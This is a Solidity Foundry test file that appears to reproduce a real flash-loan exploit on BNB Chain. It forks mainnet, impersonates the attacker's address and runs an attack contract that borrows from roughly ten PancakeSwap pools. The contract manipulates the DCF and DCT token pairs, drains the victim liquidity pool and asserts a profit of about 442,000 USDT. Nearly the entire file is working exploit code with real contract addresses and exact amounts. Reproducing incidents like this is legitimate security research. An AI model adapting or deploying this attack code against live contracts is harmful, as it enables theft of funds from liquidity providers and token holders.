
pragma solidity ^0.8.20;

import "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 44290969;
    uint256 constant TX_TIMESTAMP = 1732453676;
    uint256 constant TX_BLOCK_NUMBER = 44290970;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack = _deployAttack();
        _prepareProfit(attack);
        _logBalances("Before exploit");
        _executeAttack(attack);
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
        _assertEcon();
    }

    function _deployAttack() internal returns (OurAttack attack) {
        if (ATTACK_CONTRACT != address(0)) {
            _etchAttackRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
    }

    function _prepareProfit(OurAttack attack) internal {
        _prepareProfit(address(attack), address(0));
    }

    function _executeAttack(OurAttack attack) internal {
        attack.attack{value: TX_VALUE}();
    }

    function _etchAttackRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
    }

    function _expectProfitLegs(address attack, address attackChild) internal override {
        attack;
        attackChild;
        _expectProfit(Addresses.attack_contract, attack, Addresses.USDT, "USDT", 442028607465892649035455);
        _expectProfit(Addresses.attack_contract, attack, Addresses.DCF, "DCF", 985197002370912963);
        economicOracles.push(
            EconomicOracle(
                Addresses.Cake_LP_01B6,
                Addresses.USDT,
                "USDT",
                "victim_loss",
                false,
                698634386264319526727426,
                false
            )
        );
        economicOracles.push(
            EconomicOracle(
                Addresses.Cake_LP_01B6,
                Addresses.DCF,
                "DCF",
                "victim_loss",
                false,
                3995823659092104219335,
                false
            )
        );
    }
}

contract OurAttack {
    function attack() external payable {
        _startFlashBorrow();
    }

    function _startFlashBorrow() internal {
        _readSeedPoolUSDT();
        _borrowSeedPool();
        _readAttackUSDT();
    }

    function _readSeedPoolUSDT() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_92B780_3121);
    }

    function _borrowSeedPool() internal {
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000001);
            IPancakeV3Pool(Addresses.A_92B780_3121).flash(address(this), 5322925517933464020123149, 0, flashProof);
        }
    }

    function _readAttackUSDT() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function _swapLP825DEntry() internal {
        _callbackDone[CALLBACK_2] = true;
        _readLP825D();
        _swapLP825D();
    }

    function _readLP825D() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_825D);
    }

    function _swapLP825D() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_825D)
            .swap(
                4544111323480721752049811,
                0,
                address(this),
                hex"0000000000000000000000000000000000000000000000000000000000000002"
            );
    }

    function _swapLP293DEntry() internal {
        _callbackDone[CALLBACK_3] = true;
        _swapLP293D();
    }

    function _swapLP293D() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_293D);
        IUniswapV2PairLike(Addresses.Cake_LP_293D)
            .swap(
                0,
                3650552215952954968112038,
                address(this),
                hex"0000000000000000000000000000000000000000000000000000000000000004"
            );
    }

    function _swapLP19C1Entry() internal {
        _callbackDone[CALLBACK_4] = true;
        _swapLP19C1();
    }

    function _swapLP19C1() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_0EC5);
        IUniswapV2PairLike(Addresses.Cake_LP_0EC5)
            .swap(
                0,
                2799751027452964189493667,
                address(this),
                hex"0000000000000000000000000000000000000000000000000000000000000006"
            );
    }

    function _swapLP0EC5Entry() internal {
        _callbackDone[CALLBACK_5] = true;
        _swapLP0EC5();
    }

    function _swapLP0EC5() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_19C1);
        IUniswapV2PairLike(Addresses.Cake_LP_19C1)
            .swap(
                3223205325775688805378613,
                0,
                address(this),
                hex"0000000000000000000000000000000000000000000000000000000000000005"
            );
    }

    function _settleVictimSwap() internal {
        _callbackDone[CALLBACK_6] = true;
        _readAttackBalances();
        _pullDcfFromEOA();
        _readVictimDcf();
        _quoteDcfForUsdt();
        _approveUsdtRouter();
        _buyDcfWithUsdt();
        _readUsdtPools();
        _approveUsdtRouter2();
        _buyDctWithUsdt();
        _readDctDcfPools();
        _readVictimDcf2();
        _seedDcfVictim();
        _readVictimRes();
        _readVictimDcf3();
        _quoteDcfToUsdt();
        _swapVictimPool();
        _approveDctRouter();
        _sellDctForUsdt();
        _readUsdtForRepay();
        _repayFlashBatch1();
        _repayFlashBatch2();
        _repayFlashBatch3();
        _repayFlashBatch4();
        _repayFlashBatch5();
        _repayFlashBatch6();
        _repayFlashBatch7();
        _repayFlashBatch8();
        _repayFlashBatch9();
        _repayFlashBatch10();
        _repayFlashBatch11();
    }

    function _readAttackBalances() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.DCF).balanceOf(Addresses.attacker_eoa);
    }

    function _pullDcfFromEOA() internal {
        IERC20Like(Addresses.DCF).transferFrom(Addresses.attacker_eoa, address(this), 83741736701527601701);
        IERC20Like(Addresses.DCF).balanceOf(address(this));
    }

    function _readVictimDcf() internal {
        IERC20Like(Addresses.DCF).balanceOf(Addresses.Cake_LP_01B6);
    }

    function _quoteDcfForUsdt() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsIn(4039270842434161480922, _addressArray2(Addresses.USDT, Addresses.DCF));
    }

    function _approveUsdtRouter() internal {
        IERC20Like(Addresses.DCF).balanceOf(address(this));
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
    }

    function _buyDcfWithUsdt() internal {
        uint256 swapAmountIn = 80435691245080307237888143;
        if (swapAmountIn != 0) {
            if (IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
                IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
            }
            IPancakeRouter(Addresses.PancakeRouter)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    swapAmountIn,
                    0,
                    _addressArray2(Addresses.USDT, Addresses.DCF),
                    Addresses.A_166001_F404,
                    1732453876
                );
        }
    }

    function _readUsdtPools() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_A651);
    }

    function _approveUsdtRouter2() internal {
        IERC20Like(Addresses.DCT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
    }

    function _buyDctWithUsdt() internal {
        uint256 swapAmountIn = 29919669280925435923030360;
        if (swapAmountIn != 0) {
            if (IERC20Like(Addresses.USDT).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
                IERC20Like(Addresses.USDT).approve(Addresses.PancakeRouter, type(uint256).max);
            }
            IPancakeRouter(Addresses.PancakeRouter)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    swapAmountIn, 0, _addressArray2(Addresses.USDT, Addresses.DCT), address(this), 1732453876
                );
        }
    }

    function _readDctDcfPools() internal {
        IERC20Like(Addresses.DCT).balanceOf(address(this));
        IERC20Like(Addresses.DCF).balanceOf(Addresses.Cake_LP_01B6);
    }

    function _readVictimDcf2() internal {
        IERC20Like(Addresses.DCF).balanceOf(Addresses.Cake_LP_01B6);
    }

    function _seedDcfVictim() internal {
        uint256 victimDcfSeed = 82756539699156688738;
        IERC20Like(Addresses.DCF).transfer(Addresses.Cake_LP_01B6, victimDcfSeed);
        IERC20Like(Addresses.DCF).balanceOf(Addresses.Cake_LP_01B6);
    }

    function _readVictimRes() internal {
        ICake_LP_01B6(Addresses.Cake_LP_01B6).getReserves();
    }

    function _readVictimDcf3() internal {
        IERC20Like(Addresses.DCF).balanceOf(Addresses.Cake_LP_01B6);
    }

    function _quoteDcfToUsdt() internal {
        IPancakeRouter(Addresses.PancakeRouter)
            .getAmountsOut(78618712714198854302, _addressArray2(Addresses.DCF, Addresses.USDT));
    }

    function _swapVictimPool() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_01B6).swap(72612978985490861981525879, 0, address(this), hex"");
        uint256 pairUsdtSeed = 1000000000000000000;
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_A651, pairUsdtSeed);
    }

    function _approveDctRouter() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.DCT).approve(Addresses.PancakeRouter, type(uint256).max);
    }

    function _sellDctForUsdt() internal {
        uint256 swapAmountIn = 1062693418683145675940998;
        if (swapAmountIn != 0) {
            if (IERC20Like(Addresses.DCT).allowance(address(this), Addresses.PancakeRouter) < swapAmountIn) {
                IERC20Like(Addresses.DCT).approve(Addresses.PancakeRouter, type(uint256).max);
            }
            IPancakeRouter(Addresses.PancakeRouter)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    swapAmountIn, 0, _addressArray2(Addresses.DCT, Addresses.USDT), address(this), 1732453876
                );
        }
    }

    function _readUsdtForRepay() internal {
        IERC20Like(Addresses.USDT).balanceOf(address(this));
        IERC20Like(Addresses.USDT).balanceOf(address(this));
    }

    function _repayFlashBatch1() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.A_92B780_3121, 5323457810485257366525162);
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_2050, 44824198669297897842852226);
    }

    function _repayFlashBatch2() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_40EB, 13487324520471401871447302);
    }

    function _repayFlashBatch3() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_A7C4, 2301376150496149397812900);
    }

    function _repayFlashBatch4() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool, 4206281884698364296454641);
        IERC20Like(Addresses.USDT).transfer(Addresses.A_BE1418_01A5, 2510333319798195436561925);
    }

    function _repayFlashBatch5() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_0B76, 2132164222238047555312462);
    }

    function _repayFlashBatch6() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_F442, 1791413505022380015070754);
    }

    function _repayFlashBatch7() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.PancakeV3Pool_74A1, 3715443043298333762989720);
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP, 9944756063525866311156095);
    }

    function _repayFlashBatch8() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_825D, 4555517042902658363647456);
    }

    function _repayFlashBatch9() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_2117, 5983891086403821434912447);
    }

    function _repayFlashBatch10() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_293D, 3659715102014996885081999);
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_19C1, 3231295571143385784280113);
    }

    function _repayFlashBatch11() internal {
        IERC20Like(Addresses.USDT).transfer(Addresses.Cake_LP_0EC5, 2806778402531871129609296);
    }

    function _swapLP2117Entry() internal {
        _callbackDone[CALLBACK_7] = true;
        _readLP2117();
        _swapLP2117();
    }

    function _readLP2117() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP_2117);
    }

    function _swapLP2117() internal {
        IUniswapV2PairLike(Addresses.Cake_LP_2117)
            .swap(
                5968909124501323113896567,
                0,
                address(this),
                hex"0000000000000000000000000000000000000000000000000000000000000003"
            );
    }

    function flashCallback() internal {
        _callbackDone[CALLBACK_8] = true;
        _swapLP0DAE();
    }

    function _swapLP0DAE() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.Cake_LP);
        IUniswapV2PairLike(Addresses.Cake_LP)
            .swap(
                9919857221898900071975437,
                0,
                address(this),
                hex"0000000000000000000000000000000000000000000000000000000000000001"
            );
    }

    function flashCallback2() internal {
        _callbackDone[CALLBACK_9] = true;
        _readV3A7C4();
        _borrowV3A7C4();
    }

    function _readV3A7C4() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_A7C4);
    }

    function _borrowV3A7C4() internal {
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000004);
            IPancakeV3Pool(Addresses.PancakeV3Pool_A7C4)
                .flash(address(this), 2300226037477410692466666, 0, flashProof);
        }
    }

    function flashCallback3() internal {
        _callbackDone[CALLBACK_10] = true;
        _readV3F442();
        _borrowV3F442();
    }

    function _readV3F442() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_F442);
    }

    function _borrowV3F442() internal {
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000008);
            IPancakeV3Pool(Addresses.PancakeV3Pool_F442)
                .flash(address(this), 1791234381584221592911462, 0, flashProof);
        }
    }

    function flashCallback4() internal {
        _callbackDone[CALLBACK_11] = true;
        _readV3F849();
        _borrowV3F849();
    }

    function _readV3F849() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool);
    }

    function _borrowV3F849() internal {
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000005);
            IPancakeV3Pool(Addresses.PancakeV3Pool).flash(address(this), 4205861298568507445710069, 0, flashProof);
        }
    }

    function flashCallback5() internal {
        _callbackDone[CALLBACK_12] = true;
        _readV374A1();
        _borrowV374A1();
    }

    function _readV374A1() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_74A1);
    }

    function _borrowV374A1() internal {
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000009);
            IPancakeV3Pool(Addresses.PancakeV3Pool_74A1)
                .flash(address(this), 0, 3706177599300083554104458, flashProof);
        }
    }

    function flashCallback6() internal {
        _callbackDone[CALLBACK_13] = true;
        _readPool01A5();
        _borrowPool01A5();
    }

    function _readPool01A5() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.A_BE1418_01A5);
    }

    function _borrowPool01A5() internal {
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000006);
            IPancakeV3Pool(Addresses.A_BE1418_01A5).flash(address(this), 0, 2509078780407991440841504, flashProof);
        }
    }

    function flashCallback7() internal {
        _callbackDone[CALLBACK_14] = true;
        _readV32050();
        _borrowV32050();
    }

    function _readV32050() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_2050);
    }

    function _borrowV32050() internal {
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000002);
            IPancakeV3Pool(Addresses.PancakeV3Pool_2050)
                .flash(address(this), 44801797770412691497103674, 0, flashProof);
        }
    }

    function flashCallback8() internal {
        _callbackDone[CALLBACK_15] = true;
        _readV340EB();
        _borrowV340EB();
    }

    function _readV340EB() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_40EB);
    }

    function _borrowV340EB() internal {
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000003);
            IPancakeV3Pool(Addresses.PancakeV3Pool_40EB)
                .flash(address(this), 13480584228357223259817393, 0, flashProof);
        }
    }

    function flashCallback9() internal {
        _callbackDone[CALLBACK_16] = true;
        _readV30B76();
        _borrowV30B76();
    }

    function _readV30B76() internal {
        IERC20Like(Addresses.USDT).balanceOf(Addresses.PancakeV3Pool_0B76);
    }

    function _borrowV30B76() internal {
        {
            bytes memory flashProof = abi.encode(0x0000000000000000000000000000000000000007);
            IPancakeV3Pool(Addresses.PancakeV3Pool_0B76)
                .flash(address(this), 0, 2131098672901596756933995, flashProof);
        }
    }

    receive() external payable {}

    function pancakeV3FlashCallback(uint256 borrowedAmount0, uint256 borrowedAmount1, bytes calldata callbackPayload)
        external
        payable
    {
        borrowedAmount0;
        borrowedAmount1;
        callbackPayload;
        if (msg.sender == Addresses.A_92B780_3121) {
            if (!_callbackDone[CALLBACK_14]) flashCallback7();
            return;
        }
        if (msg.sender == Addresses.PancakeV3Pool_2050) {
            if (!_callbackDone[CALLBACK_15]) flashCallback8();
            return;
        }
        if (msg.sender == Addresses.PancakeV3Pool_40EB) {
            if (!_callbackDone[CALLBACK_9]) flashCallback2();
            return;
        }
        if (msg.sender == Addresses.PancakeV3Pool_A7C4) {
            if (!_callbackDone[CALLBACK_11]) flashCallback4();
            return;
        }
        if (msg.sender == Addresses.PancakeV3Pool) {
            if (!_callbackDone[CALLBACK_13]) flashCallback6();
            return;
        }
        if (msg.sender == Addresses.A_BE1418_01A5) {
            if (!_callbackDone[CALLBACK_16]) flashCallback9();
            return;
        }
        if (msg.sender == Addresses.PancakeV3Pool_0B76) {
            if (!_callbackDone[CALLBACK_10]) flashCallback3();
            return;
        }
        if (msg.sender == Addresses.PancakeV3Pool_F442) {
            if (!_callbackDone[CALLBACK_12]) flashCallback5();
            return;
        }
        if (msg.sender == Addresses.PancakeV3Pool_74A1) {
            if (!_callbackDone[CALLBACK_8]) flashCallback();
            return;
        }
        if (!_callbackDone[CALLBACK_14]) flashCallback7();
        return;
    }

    fallback() external payable {
        if (msg.sig == 0x47e493d5) {
            _startFlashBorrow();
            return;
        }
        if (msg.sig == 0x84800812) {
            if (msg.sender == Addresses.Cake_LP) {
                if (!_callbackDone[CALLBACK_2]) _swapLP825DEntry();
                return;
            }
            if (msg.sender == Addresses.Cake_LP_825D) {
                if (!_callbackDone[CALLBACK_7]) _swapLP2117Entry();
                return;
            }
            if (msg.sender == Addresses.Cake_LP_2117) {
                if (!_callbackDone[CALLBACK_3]) _swapLP293DEntry();
                return;
            }
            if (msg.sender == Addresses.Cake_LP_293D) {
                if (!_callbackDone[CALLBACK_5]) _swapLP0EC5Entry();
                return;
            }
            if (msg.sender == Addresses.Cake_LP_19C1) {
                if (!_callbackDone[CALLBACK_4]) _swapLP19C1Entry();
                return;
            }
            if (msg.sender == Addresses.Cake_LP_0EC5) {
                if (!_callbackDone[CALLBACK_6]) _settleVictimSwap();
                return;
            }
            if (!_callbackDone[CALLBACK_2]) _swapLP825DEntry();
            return;
        }
        return;
    }

    bytes32 private constant CALLBACK_2 = keccak256("poc.callback.CALLBACK_2");
    bytes32 private constant CALLBACK_3 = keccak256("poc.callback.CALLBACK_3");
    bytes32 private constant CALLBACK_4 = keccak256("poc.callback.CALLBACK_4");
    bytes32 private constant CALLBACK_5 = keccak256("poc.callback.CALLBACK_5");
    bytes32 private constant CALLBACK_6 = keccak256("poc.callback.CALLBACK_6");
    bytes32 private constant CALLBACK_7 = keccak256("poc.callback.CALLBACK_7");
    bytes32 private constant CALLBACK_8 = keccak256("poc.callback.CALLBACK_8");
    bytes32 private constant CALLBACK_9 = keccak256("poc.callback.CALLBACK_9");
    bytes32 private constant CALLBACK_10 = keccak256("poc.callback.CALLBACK_10");
    bytes32 private constant CALLBACK_11 = keccak256("poc.callback.CALLBACK_11");
    bytes32 private constant CALLBACK_12 = keccak256("poc.callback.CALLBACK_12");
    bytes32 private constant CALLBACK_13 = keccak256("poc.callback.CALLBACK_13");
    bytes32 private constant CALLBACK_14 = keccak256("poc.callback.CALLBACK_14");
    bytes32 private constant CALLBACK_15 = keccak256("poc.callback.CALLBACK_15");
    bytes32 private constant CALLBACK_16 = keccak256("poc.callback.CALLBACK_16");
    mapping(bytes32 => bool) private _callbackDone;

    function _addressArray2(address a0, address a1) internal pure returns (address[] memory out) {
        out = new address[](2);
        out[0] = a0;
        out[1] = a1;
    }
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_000000_6F67 = 0x000000000000000000636F6e736F6c652e6c6f67;
    address internal constant attacker_eoa = 0x00c58434F247DFdCA49b9EE82f3013BAC96F60FF;
    address internal constant Cake = 0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82;
    address internal constant PancakeRouter = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address internal constant RACA = 0x12BB890508c125661E03b09EC06E404bc9289040;
    address internal constant A_166001_F404 = 0x16600100b04d17451a03575436B4090f6Ff8f404;
    address internal constant Cake_LP = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
    address internal constant PancakeV3Pool = 0x172fcD41E0913e95784454622d1c3724f546f849;
    address internal constant PancakeV3Pool_0B76 = 0x1936be860d93B0Ff98f3a9b83254D61A78930B76;
    address internal constant wkeyDAO = 0x194B302a4b0a79795Fb68E2ADf1B8c9eC5ff8d1F;
    address internal constant ETH = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
    address internal constant PancakeV3Pool_F442 = 0x247f51881d1E3aE0f759AFB801413a6C948Ef442;
    address internal constant NVB = 0x3595AfFf15A7ccaeeEb787Fd676f7A297319C24c;
    address internal constant PancakeV3Pool_2050 = 0x36696169C63e42cd08ce11f5deeBbCeBae652050;
    address internal constant A_383237_3338 = 0x3832373536353339363939313536363838373338;
    address internal constant A_383337_3031 = 0x3833373431373336373031353237363031373031;
    address internal constant A_454C47_A9E5 = 0x454c4707c47aB00256B03e0D1B2DcB97Ebd5A9e5;
    address internal constant PancakeV3Pool_A7C4 = 0x46Cf1cF8c69595804ba91dFdd8d6b960c9B0a7C4;
    address internal constant PancakeV3Pool_40EB = 0x4f31Fa980a675570939B737Ebdde0471a4Be40Eb;
    address internal constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address internal constant DCT = 0x56f46bD073E9978Eb6984C0c3e5c661407c3A447;
    address internal constant Cake_LP_293D = 0x5a5fD4DBF70747E684F43B43aB53d4b0C733293D;
    address internal constant Cake_LP_A651 = 0x5aaC7375196e9eA76b1598ed4BE19B41fA5Ba651;
    address internal constant BTCB = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
    address internal constant attack_contract = 0x77aB960503659711498A4C0BC99a84e8D0A47589;
    address internal constant Cake_LP_825D = 0x7C1f8F5d8d000b00a2Eaa3c21071dBca18f6825d;
    address internal constant PancakeV3Pool_74A1 = 0x7f51c8AaA6B0599aBd16674e2b17FEc7a9f674A1;
    address internal constant Cake_LP_01B6 = 0x8487f846d59F8FB4f1285C64086b47e2626C01B6;
    address internal constant Cake_LP_0EC5 = 0x8665A78ccC84D6Df2ACaA4b207d88c6Bc9b70Ec5;
    address internal constant USDC = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
    address internal constant A_92B780_3121 = 0x92b7807bF19b7DDdf89b706143896d05228f3121;
    address internal constant A_A5A382_78C8 = 0xA5a3825Ca3C471B47e19CE3fE72495Ec6b5d78c8;
    address internal constant DCF = 0xA7e92345ddF541Aa5CF60feE2a0e721C50Ca1adb;
    address internal constant A_AABF7B_C472 = 0xaAbf7BF47201abF99fCA6b38b038Bc2c40e7C472;
    address internal constant Cake_LP_19C1 = 0xB51f9508B88F0868aE14E74C5D7d1F34E2f419c1;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant USDC_0B5C = 0xBA5Fe23f8a3a24BEd3236F05F2FcF35fd0BF0B5C;
    address internal constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address internal constant A_BE1418_01A5 = 0xBe141893E4c6AD9272e8C04BAB7E6a10604501a5;
    address internal constant MOS = 0xc9C8050639c4cC0DF159E0e47020d6e392191407;
    address internal constant A_D252A9_41EC = 0xd252a9b7ae559b18B9E61A1C4B93a56Bcef741eC;
    address internal constant FSP = 0xdC84096074269d8F304D476124101249d105b60d;
    address internal constant A_EE4427_5994 = 0xEe4427A0bCFac88a8d0E4A0Ae9AC2975bc735994;
    address internal constant Cake_LP_2117 = 0xF31cb18759FE8356348c81268b859d2a32bf2117;
    address internal constant COCO = 0xF563E86e461dE100CfCfD8b65dAA542d3d4B0550;
    address internal constant A_FFFFFF_FFFF = 0xFFfFfFffFFfffFFfFFfFFFFFffFFFffffFfFFFfF;
}

interface ICake_LP_01B6 {
    function getReserves() external view;
}

interface IPancakeV3Pool {
    function flash(address, uint256, uint256, bytes calldata) external;
}

interface IPancakeRouter {
    function getAmountsIn(uint256, address[] calldata) external view;
    function getAmountsOut(uint256, address[] calldata) external view;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] calldata,
        address,
        uint256
    ) external;
}

interface IUniswapV2PairLike {
    function swap(uint256, uint256, address, bytes calldata) external;
}
